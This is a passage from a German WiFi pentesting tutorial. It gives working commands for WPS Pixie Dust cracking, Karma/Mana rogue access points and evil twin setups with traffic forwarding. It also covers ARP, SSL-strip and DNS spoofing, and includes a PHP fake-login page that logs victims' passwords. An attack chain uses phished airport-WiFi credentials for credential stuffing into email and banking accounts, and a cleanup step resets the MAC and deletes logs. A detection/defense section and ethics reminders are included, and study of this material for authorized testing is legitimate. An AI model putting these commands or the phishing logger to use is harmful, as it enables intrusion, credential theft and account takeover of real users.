reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -s sessions/ -vv
```

### WPS Pixie Dust Attack

**Noch schneller: Pixie Dust**

Manche Router haben schwache Zufallszahlen:
- Offline-Berechnung möglich
- Sekunden statt Stunden

```bash
# Mit reaver + pixiedust
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -K -vv

# -K = Pixie Dust Attack

# Wenn anfällig:
# [Pixie-Dust] WPS PIN: '12345678'
# [Pixie-Dust] WPA PSK: 'Password123'
```

**Oder mit bully:**
```bash
apt-get install bully

bully -b AA:BB:CC:DD:EE:FF -d -v 3 wlan0

# -d = Pixie Dust
```

### WPS Schutz

**Als Admin:**
- **WPS komplett deaktivieren** (beste Lösung)
- Rate-Limiting aktivieren (verzögert Angriff)
- Router-Firmware updaten

**Viele Router:**
- "WPS Lock" nach fehlgeschlagenen Versuchen
- Reaver erkennt das und stoppt

---

## 7. Karma und Mana Attacks

### Theorie: Probe Request Exploitation

**Normale Situation:**
- Client sucht bekannte Netzwerke
- Sendet Probe Requests: "Kennt jemand 'HomeWiFi'?"
- Nur echte "HomeWiFi" AP antwortet

**Karma Attack:**
- Angreifer-AP antwortet auf **ALLE** Probe Requests
- "Ja, ich bin 'HomeWiFi'!" (lügt)
- Client verbindet sich
- Client denkt es ist zuhause

**Mana Attack:**
- Wie Karma, aber moderner
- Antwortet auch auf Broadcasts
- Aggressiver

### Karma Attack mit hostapd-mana

```bash
# Installiere hostapd-mana
git clone https://github.com/sensepost/hostapd-mana
cd hostapd-mana
make
make install
```

**hostapd-mana Config:**
```bash
cat > /tmp/mana.conf << EOF
interface=wlan0
driver=nl80211
ssid=InternetAccess
channel=6

# Karma aktivieren
karma_attack=1

# Enable Loud Karma (antwortet auf Broadcast Probes)
enable_loud_karma=1

# MANA
mana_wpaout=/tmp/mana_wpa.txt
mana_credout=/tmp/mana_credentials.txt
mana_eapout=/tmp/mana_eap.txt
EOF
```

**Starte:**
```bash
hostapd-mana /tmp/mana.conf

# AP ist jetzt live
# Antwortet auf ALLE Probe Requests
# Clients verbinden sich automatisch
```

**Captured SSIDs:**
```bash
cat /tmp/mana_wpa.txt

# Zeigt alle SSIDs die Clients gesucht haben:
# HomeWiFi
# Office-WLAN
# Starbucks
# Hotel-Guest
```

**Credentials (falls Client versucht zu authentifizieren):**
```bash
cat /tmp/mana_credentials.txt

# Kann MSCHAP Handshakes enthalten
# Crackbar mit hashcat
```

### Kombination: Karma + Evil Twin + Captive Portal

```bash
# Setup:
# 1. hostapd-mana für Karma
# 2. dnsmasq für DHCP
# 3. Apache für Fake Login

# Wenn Client verbindet:
# → Bekommt IP
# → Wird zu login.html redirected
# → Gibt Credentials ein
# → Du hast echtes Passwort

# Perfekte Kombination!
```

---

## 8. Advanced Attack Chains

### Attack Chain 1: Full Compromise

**Ziel:** Von außen zu vollem Netzwerk-Zugriff

```
1. RECONNAISSANCE
   → airodump-ng scan
   → Finde Target: SSID "CompanyWiFi"
   → BSSID: AA:BB:CC:DD:EE:FF, WPA2-PSK

2. HANDSHAKE CAPTURE
   → airodump-ng capture
   → aireplay-ng deauth
   → Handshake captured

3. CRACKING
   → Kopiere zu PC
   → hashcat mit großer Wordlist
   → Password gefunden: "Company2023!"

4. ACCESS
   → Verbinde mit echtem Passwort
   → Bin jetzt im Netzwerk

5. INTERNAL RECON
   → nmap -sn 192.168.1.0/24
   → Finde alle Hosts

6. EXPLOITATION
   → nmap -sV für Service-Versionen
   → Suche Schwachstellen
   → Exploit für SMB/HTTP/etc.

7. LATERAL MOVEMENT
   → ARP Spoofing für MITM
   → Credential Sniffing
   → Weiterer Zugriff

8. EXFILTRATION
   → Daten rausschicken
   → Backdoor installieren
```

### Attack Chain 2: Evil Twin + Social Engineering

```
1. SETUP
   → Evil Twin AP: "Free Airport WiFi"
   → Captive Portal mit Fake-Formular

2. SOCIAL ENGINEERING
   → "Please enter your email for access"
   → "Verify with your social media login"
   → Opfer gibt Credentials ein

3. CREDENTIAL THEFT
   → Email + Password logged
   → Teste auf anderen Services (Credential Stuffing)

4. ACCOUNT COMPROMISE
   → Login in Email
   → Finde weitere Credentials
   → Zugriff auf Cloud, Banking, etc.
```

### Attack Chain 3: WPS → WPA → Network

```
1. WPS DISCOVERY
   → wash -i wlan0
   → WPS enabled AP gefunden

2. WPS ATTACK
   → reaver -K (Pixie Dust)
   → WPS PIN: 12345678
   → WPA PSK: SecretPass

3. NETWORK ACCESS
   → Verbinde mit WPA Passwort

4. PERSISTENT ACCESS
   → Installiere Backdoor auf Router
   → Oder: Rogue AP im Netzwerk
   → Oder: Kompromittiere internes System
```

---

## 9. Detection und Defense

### Attack Detection

**Als Network Admin - Was zeigt einen Angriff?**

#### Deauth Attack Detection

**Wireshark:**
```
wlan.fc.type_subtype == 0x0c

# Viele Deauths in kurzer Zeit = Angriff
```

**IDS (Intrusion Detection):**
```bash
# Mit Kismet (Alerts)
# Suche nach: DEAUTHFLOOD

# Mit Snort
# Regel: alert wifi any any -> any any (msg:"WiFi Deauth Flood"; ...)
```

#### Evil Twin Detection

**Indicators:**
- Zwei APs mit gleicher SSID, verschiedenen BSSIDs
- Ungewöhnlich starkes Signal
- Unterschiedliche Verschlüsselung (Open vs. WPA2)

**Tools:**
```bash
# Mit airodump-ng
# Gleiche ESSID, verschiedene BSSID = Verdächtig

# Mit Kismet
# Alert: BSSID_CONFLICT
```

#### ARP Spoofing Detection

**Indicators:**
- Mehrere IPs mit gleicher MAC
- Gateway-MAC ändert sich plötzlich

**Tools:**
```bash
# arpwatch
apt-get install arpwatch
arpwatch -i wlan0

# Logs: /var/log/arpwatch/arp.dat
# Alarmiert bei MAC-Änderungen
```

### Defense Mechanisms

#### Für Access Points / Router

**1. Starkes WPA2/WPA3 Passwort:**
```
- Mindestens 16 Zeichen
- Groß/Klein, Zahlen, Sonderzeichen
- Keine Wörterbuch-Wörter
- Beispiel: "kT9$mP2#vL5&qX8!"
```

**2. WPS deaktivieren:**
- Router-Admin → WPS → OFF

**3. Management Frame Protection (802.11w):**
- Router-Settings → PMF/MFP → Enable
- Verhindert Deauth-Attacks

**4. Versteckte SSID:**
- Hilft wenig, aber zusätzlicher Layer
- Nicht als einzige Sicherheit!

**5. MAC-Filtering:**
- Nur bekannte MACs erlauben
- Umgehbar, aber erhöht Aufwand

**6. Client Isolation:**
- Clients können sich nicht gegenseitig sehen
- Verhindert Client-zu-Client Attacks

**7. Strong Encryption:**
- WPA3 wenn möglich
- WPA2-AES (nicht TKIP)
- Enterprise mit RADIUS wenn möglich

#### Für Clients

**1. VPN nutzen:**
- Verschlüsselt kompletten Traffic
- Auch in Evil Twin sicher

**2. HTTPS-Only:**
- Browser-Extension: HTTPS Everywhere
- Niemals Passwörter über HTTP

**3. Vorsicht bei offenen WLANs:**
- Nie Banking/Shopping
- Immer VPN
- Certificate Warnings ernst nehmen

**4. Vergesse alte Netzwerke:**
- Smartphone/Laptop merkt sich SSIDs
- Löschen von alten/unsicheren Netzwerken

**5. Automatische Verbindung deaktivieren:**
- Manuell verbinden
- Verhindert Karma-Attacks

#### Für Unternehmen

**1. Enterprise WPA2/WPA3:**
- RADIUS-Server
- Individuelle Credentials
- Keine Shared Keys

**2. 802.1X Authentifizierung:**
- Certificate-based
- EAP-TLS wenn möglich

**3. Wireless IDS/IPS:**
- Dedizierte WIPS (z.B. Cisco, Aruba)
- Erkennt Rogue APs, Deauths, Evil Twins

**4. Network Segmentation:**
- WiFi in separatem VLAN
- Kein direkter Zugriff auf kritische Systeme

**5. Regular Audits:**
- Pentesting durch Professionals
- Vulnerability Scanning

**6. Monitoring:**
- 24/7 Network Monitoring
- SIEM für Correlation

---

## 10. Praktische Übungen

### Übung 1: End-to-End WPA2 Crack

**Ziel:** Vom Handshake-Capture bis zum gecrackten Passwort.

**Setup:**
- Router mit Test-WLAN (schwaches Passwort: "password123")

**Schritte:**
1. Scanne und finde Target
2. Capture Handshake (Deauth)
3. Verifiziere Handshake
4. Kopiere zu PC
5. Cracke mit hashcat
6. Dokumentiere Zeit und Hash-Rate
7. Verbinde mit gefundenem Passwort

**Bonus:**
- Wie lange dauert es mit verschiedenen Wordlists?
- GPU vs. CPU Speed?

### Übung 2: Evil Twin mit Captive Portal

**Ziel:** Vollständiger Evil Twin + Credential Harvesting.

**Setup:**
- Zwei WiFi-Interfaces (oder ein Interface ohne Internet)

**Schritte:**
1. Erstelle hostapd Config (gleiche SSID wie dein Hauptnetz)
2. Setup dnsmasq
3. Setup Apache + PHP Login-Seite
4. Starte alles
5. Verbinde Test-Gerät (eigenes Smartphone)
6. Gib Test-Credentials ein
7. Prüfe Log-Datei

**Learning Points:**
- Wie realistisch muss die Fake-Seite sein?
- Merken Nutzer den Unterschied?

### Übung 3: MITM auf eigenem Netzwerk

**Ziel:** Traffic von deinem eigenen Smartphone abfangen.

**Setup:**
- Flipper im gleichen WLAN wie Smartphone
- Oder: Evil Twin

**Schritte:**
1. ARP Spoofing auf Smartphone-IP
2. Starte tcpdump
3. Surfe auf Smartphone (HTTP-Seiten)
4. Analysiere Capture in Wireshark
5. Finde URLs, User-Agents, etc.

**Bonus:**
- Versuche SSL-Strip (funktioniert bei welchen Sites?)
- DNS-Spoofing zu Fake-Google

### Übung 4: WPS PIN Attack (falls Router WPS hat)

**Ziel:** Cracke WPS PIN eines Test-Routers.

**Setup:**
- Alter Router mit WPS enabled
- Oder: Nutze virtuellen Router

**Schritte:**
1. wash scan für WPS-enabled APs
2. Starte reaver
3. Warte (kann Stunden dauern)
4. Dokumentiere gefundenen PIN + Passwort

**Learning:**
- Wie lange dauert es wirklich?
- Rate-Limiting Effekt?

### Übung 5: Defense Testing

**Ziel:** Teste Verteidigungen gegen deine eigenen Attacks.

**Setup:**
- Eigener Router mit verschiedenen Konfigs

**Tests:**
1. **Baseline:** Normaler WPA2, einfaches Passwort
   - Handshake Crack → Erfolg
2. **Strong Password:** 20 Zeichen, komplex
   - Handshake Crack → Unmöglich
3. **WPA3 + MFP:** Modern Router
   - Deauth → Blockiert
   - WPA3 Handshake → Schwerer zu cracken
4. **Client Isolation:** Aktiviert
   - ARP Spoof zwischen Clients → Blockiert

**Dokumentiere:**
- Welche Defenses funktionieren?
- Wo sind Lücken?

### Übung 6: Red Team Scenario

**Ziel:** Simuliere kompletten Penetration Test.

**Scenario:**
- Du bist externer Pentester
- Ziel: Zugriff auf Firmen-WLAN
- Scope: Nur WiFi, keine physischen Zugriff

**Phasen:**
1. **Recon:** Passive Scans, keine Deauths
2. **Active Recon:** Handshake Capture erlaubt
3. **Exploitation:** Cracking, Evil Twin, etc.
4. **Reporting:** Dokumentiere Findings

**Report muss enthalten:**
- Executive Summary
- Detailed Findings
- Risk Ratings (Critical/High/Medium/Low)
- Recommendations
- Evidence (Screenshots, Logs)

---

## 11. Command Cheatsheet

### WPA/WPA2 Cracking

```bash
# Handshake Capture
airodump-ng -c <CH> --bssid <BSSID> -w handshake wlan0
aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT> wlan0

# Verify Handshake
aircrack-ng handshake-01.cap

# CPU Crack
aircrack-ng -w wordlist.txt handshake-01.cap

# Convert for hashcat
hcxpcapngtool -o handshake.hc22000 handshake-01.cap

# hashcat GPU Crack
hashcat -m 22000 -a 0 handshake.hc22000 wordlist.txt
hashcat -m 22000 -a 3 handshake.hc22000 ?a?a?a?a?a?a?a?a  # Brute
hashcat -m 22000 -a 6 handshake.hc22000 wordlist.txt ?d?d  # Hybrid

# PMKID Attack
hcxdumptool -i wlan0 -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

### Evil Twin

```bash
# hostapd Setup
cat > /tmp/hostapd.conf << EOF
interface=wlan0
ssid=TargetSSID
channel=6
hw_mode=g
EOF

# Managed Mode
ip link set wlan0 down
iw dev wlan0 set type managed
ip link set wlan0 up
ip addr add 192.168.10.1/24 dev wlan0

# Start hostapd
hostapd /tmp/hostapd.conf

# dnsmasq DHCP
cat > /tmp/dnsmasq.conf << EOF
interface=wlan0
dhcp-range=192.168.10.10,192.168.10.100,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
address=/#/192.168.10.1
EOF
dnsmasq -C /tmp/dnsmasq.conf -d

# Internet Forwarding (optional, wenn zweites Interface)
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o wlan1 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o wlan1 -j ACCEPT

# Traffic Capture
tcpdump -i wlan0 -w /tmp/evil_twin.pcap
```

### MITM Attacks

```bash
# ARP Spoofing
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i wlan0 -t <VICTIM_IP> <GATEWAY_IP>
arpspoof -i wlan0 -t <GATEWAY_IP> <VICTIM_IP>

# bettercap
bettercap -iface wlan0
> net.probe on
> set arp.spoof.targets <VICTIM_IP>
> arp.spoof on
> net.sniff on

# SSL Strip
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
sslstrip -l 8080 -w /tmp/sslstrip.log

# DNS Spoofing
cat > /tmp/dns_hosts << EOF
<YOUR_IP> target.com
EOF
dnsspoof -i wlan0 -f /tmp/dns_hosts

# bettercap DNS Spoof
> set dns.spoof.domains target.com
> set dns.spoof.address <YOUR_IP>
> dns.spoof on
```

### Captive Portal

```bash
# Apache Setup
apt-get install apache2 php libapache2-mod-php
systemctl start apache2

# Create Fake Login
cat > /var/www/html/index.html << EOF
<form action="login.php" method="POST">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Login</button>
</form>
EOF

# PHP Logger
cat > /var/www/html/login.php << 'EOF'
<?php
$user = $_POST['username'];
$pass = $_POST['password'];
file_put_contents('/tmp/creds.txt', "$user:$pass\n", FILE_APPEND);
header('Location: http://google.com');
?>
EOF

# DNS Redirect (all domains to captive portal)
# In dnsmasq.conf:
address=/#/<YOUR_IP>

# Check Captured Creds
tail -f /tmp/creds.txt
```

### WPS Attacks

```bash
# Scan for WPS
wash -i wlan0

# Reaver Attack
reaver -i wlan0 -b <BSSID> -vv
reaver -i wlan0 -b <BSSID> -d 5 -vv          # With delay
reaver -i wlan0 -b <BSSID> -K -vv            # Pixie Dust

# Bully (alternative)
bully -b <BSSID> -d wlan0                     # Pixie Dust
bully -b <BSSID> wlan0                        # Standard
```

### Karma/Mana

```bash
# hostapd-mana
cat > /tmp/mana.conf << EOF
interface=wlan0
ssid=FreeWiFi
channel=6
karma_attack=1
enable_loud_karma=1
mana_credout=/tmp/mana_creds.txt
EOF

hostapd-mana /tmp/mana.conf

# Check captured SSIDs
cat /tmp/mana_creds.txt
```

### Defense Testing

```bash
# Monitor for Deauths
tshark -i wlan0 -Y "wlan.fc.type_subtype == 0x0c"

# ARP Monitoring
arpwatch -i wlan0
tail -f /var/log/arpwatch/arp.dat

# Kismet with Alerts
# In kismet.conf:
alert=DEAUTHFLOOD,10/sec
alert=PROBENOJOIN,5/min

# Scan for Rogue APs
airodump-ng wlan0 | grep -i "<YOUR_SSID>"
# Zwei BSSIDs = Rogue AP!
```

### Cleanup

```bash
# Stop All
killall hostapd dnsmasq apache2 arpspoof sslstrip bettercap reaver

# Reset Interface
ip link set wlan0 down
iw dev wlan0 set type managed
ip link set wlan0 up
macchanger -p wlan0  # Reset MAC

# Flush iptables
iptables -F
iptables -t nat -F
echo 0 > /proc/sys/net/ipv4/ip_forward

# Remove Logs (oder sichere sie)
rm /tmp/*.cap /tmp/*.pcap /tmp/*.log /tmp/creds.txt
```

---

## Zusammenfassung Teil 3

🔥 Du hast jetzt gelernt:

✅ **WPA/WPA2 Cracking:**
- Handshake-basierter Offline-Angriff
- aircrack-ng (CPU) und hashcat (GPU)
- Dictionary, Brute-Force, Hybrid Attacks
- PMKID Attack (ohne Handshake)

✅ **Evil Twin Access Points:**
- Fake AP mit gleichem SSID
- hostapd + dnsmasq Setup
- Internet-Forwarding (MITM)
- Traffic Sniffing

✅ **Man-in-the-Middle:**
- ARP Spoofing
- SSL Stripping
- DNS Spoofing
- bettercap Framework

✅ **Credential Harvesting:**
- Captive Portal Creation
- Fake Login Pages
- Apache + PHP Setup
- Social Engineering Integration

✅ **WPS Attacks:**
- WPS PIN Bruteforce
- Pixie Dust Exploit
- Reaver und Bully Tools

✅ **Karma/Mana:**
- Probe Request Exploitation
- Automatische Client-Verbindung
- SSID History Harvesting

✅ **Defense:**
- Attack Detection
- Protection Mechanisms
- Best Practices
- Enterprise Security

### Die Gesamte Journey

**Teil 1: Passive Recon** → Verstehen und Beobachten
**Teil 2: Active Recon** → Interagieren und Provozieren  
**Teil 3: Attacks** → Exploiten und Kompromittieren

Du bist jetzt in der Lage:
- WiFi-Netzwerke vollständig zu analysieren
- Schwachstellen zu identifizieren
- Angriffe durchzuführen (autorisiert!)
- Verteidigungen zu implementieren

### Weiterführende Themen

**Advanced Topics (selbst erkunden):**
- WPA3 Dragonblood Attacks
- Krack Attack (Key Reinstallation)
- Advanced Rogue AP (Mana-EAP)
- WiFi Pineapple (Hardware-Plattform)
- SDR (Software Defined Radio) für WiFi
- Bluetooth/BLE Attacks
- 5G/LTE Security

**Certifications:**
- OSWP (Offensive Security Wireless Professional)
- CWSP (Certified Wireless Security Professional)
- CEH (Certified Ethical Hacker)

### Final Words ⚠️

**Remember:**
- Macht kommt mit Verantwortung
- Nur autorisierte Tests
- Dokumentiere alles
- Responsible Disclosure
- Hilf Systeme zu verbessern, nicht zu schaden

**Legal Issues:**
- Kenne lokale Gesetze
- Hole schriftliche Genehmigung
- Versichere dich
- Bei Zweifeln: Nicht machen

**Ethics:**
- Pentest vs. Hacking (Autorisierung macht den Unterschied)
- Privatsphäre respektieren
- Keine Daten exfiltrieren ohne Erlaubnis
- Keine unnötigen Schäden

---

## Hilfreiche Ressourcen

**Tools & Frameworks:**
- Aircrack-ng: https://www.aircrack-ng.org/
- hashcat: https://hashcat.net/hashcat/
- bettercap: https://www.bettercap.org/
- hostapd-mana: https://github.com/sensepost/hostapd-mana
- WiFi Pineapple: https://shop.hak5.org/

**Learning Platforms:**
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- SANS Cyber Aces: https://www.cyberaces.org/

**Communities:**
- /r/WifiHacking (Reddit)
- /r/AskNetsec (Reddit)
- Kali Linux Forums: https://forums.kali.org/
- Security Stack Exchange: https://security.stackexchange.com/

**Books:**
- "The Hacker Playbook 3" - Peter Kim
- "WiFi Security" - Stewart Miller
- "Penetration Testing" - Georgia Weidman

**Conferences:**
- DEF CON (Las Vegas)
- Black Hat
- BSides (verschiedene Städte)

---

**🎓 Glückwunsch! Du hast die komplette WiFi Pentesting Tutorial-Serie abgeschlossen!**

**Bei Fragen, Feedback oder für weitere fortgeschrittene Themen - lass es mich wissen!**

**Happy Hacking (ethically)! 🔐🐬**
